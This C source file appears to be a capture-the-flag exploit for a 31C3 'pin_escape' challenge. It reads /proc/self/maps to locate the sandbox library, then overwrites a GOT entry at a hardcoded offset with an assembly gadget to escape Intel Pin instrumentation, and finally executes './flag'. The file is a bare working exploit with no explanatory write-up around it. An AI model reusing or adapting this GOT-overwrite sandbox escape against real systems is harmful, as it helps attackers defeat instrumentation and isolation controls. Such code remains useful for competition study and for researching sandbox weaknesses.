#define OUTFD 1

static int _strlen(const char *str) {
    int l;
    for (l = 0; str[l]; l++);
    return l;
}

static void print(const char *str) {
    sys_write(OUTFD, str, _strlen(str));
}

static void println(const char *str) {
    print(str);
    print("\n");
}

static char *_strstr(const char *haystack, const char *needle) {
    register const char *s = haystack;
    register const char *p = needle;

    do {
        if (!*p) {
            return (char *) haystack;
        }
        if (*p == *s) {
            ++p;
            ++s;
        } else {
            p = needle;
            if (!*s) {
                return NULL;
            }
            s = ++haystack;
        }
    } while (1);
}

static unsigned long readhex(const char *str) {
    unsigned long val = 0;
    while(*str) {
        if (!(('9' >= *str && *str >= '0') || ('f' >= *str && *str >= 'a'))) {
            break;
        }
        if ('9' >= *str && *str >= '0') {
            val <<= 4;
            val |= *str - '0';
        }
        if ('f' >= *str && *str >= 'a') {
            val <<= 4;
            val |= *str - 'a' + 0xa;
        }
        str++;
    }
    return val;
}

asm (
    ".intel_syntax noprefix\n"
    "_pin_exit:\n"
    "   add rsp, 0x10\n"
    "   ret\n"
    ".att_syntax\n"
);
extern char _pin_exit[];

#define EXIT_GOT_OFF 0x4dc0f0

void main() {
    int fd;
    char line[4096];
    char chr;
    int offset;
    int res;

    fd = sys_open("/proc/self/maps", 0, 0);
    offset = 0;
    for (;;) {
        res = sys_read(fd, &chr, 1);
        if (res <= 0) break;
        if (chr != '\n') {
            line[offset] = chr;
            offset++;
            continue;
        }

        line[offset] = 0;
        offset = 0;

        if (_strstr(line, "31C3_pin_escape.so")) {
            println(line);
        }
    }

    unsigned long pinbase = 0x7f642345a000;
    *(unsigned long *)(pinbase + EXIT_GOT_OFF) = (unsigned long)_pin_exit;

    println("ok");
    const char *a[] = {"./flag", 0};
    sys_execve(*a, a, 0);
    println("ok2");
}

